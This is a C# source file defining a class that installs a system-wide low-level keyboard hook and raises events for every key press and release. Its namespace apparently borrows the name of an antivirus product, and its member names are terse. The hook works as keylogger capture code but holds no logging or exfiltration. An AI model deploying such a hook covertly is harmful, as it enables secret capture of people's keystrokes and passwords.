using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ALYacServer
{
    public class Low
    {
        private delegate IntPtr LKD(int code, IntPtr wordParameter, IntPtr longParameter);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string moduleName);

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int hookType, LKD callback, IntPtr moduleHandle, uint threadID);


        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hookID, int code, IntPtr wordParameter, IntPtr longParameter);


        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hookID);

        public event EventHandler<Keys> KP;

        public event EventHandler<Keys> KC;

        #region Field
        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private const int WM_SYSKEYDOWN = 0x0104;

        private const int WM_KEYUP = 0x101;

        private const int WM_SYSKEYUP = 0x105;

        private LKD lowLevelKeyboardDelegate;

        private IntPtr hookID = IntPtr.Zero;
        #endregion


        public Low()
        {
            this.lowLevelKeyboardDelegate = ProcessLowLevelKeyboard;
        }

        public void HookKeyboard()
        {
            this.hookID = SetHook(this.lowLevelKeyboardDelegate);
        }

        public void UnHookKeyboard()
        {
            UnhookWindowsHookEx(this.hookID);
        }

        private IntPtr SetHook(LKD lowLevelKeyboardDelegate)
        {
            using (Process process = Process.GetCurrentProcess())
            {
                using (ProcessModule processModule = process.MainModule)
                {
                    return SetWindowsHookEx
                    (
                        WH_KEYBOARD_LL,
                        lowLevelKeyboardDelegate,
                        GetModuleHandle(processModule.ModuleName),
                        0
                    );
                }
            }
        }

        private IntPtr ProcessLowLevelKeyboard(int code, IntPtr wordParameter, IntPtr longParameter)
        {
            if (code >= 0 && wordParameter == (IntPtr)WM_KEYDOWN || wordParameter == (IntPtr)WM_SYSKEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(longParameter);

                KP?.Invoke(this, ((Keys)vkCode));
            }

            else if (code >= 0 && wordParameter == (IntPtr)WM_KEYUP || wordParameter == (IntPtr)WM_SYSKEYUP)
            {
                int vkCode = Marshal.ReadInt32(longParameter);

                KC?.Invoke(this, ((Keys)vkCode));
            }

            return CallNextHookEx(hookID, code, wordParameter, longParameter);
        }

    }
}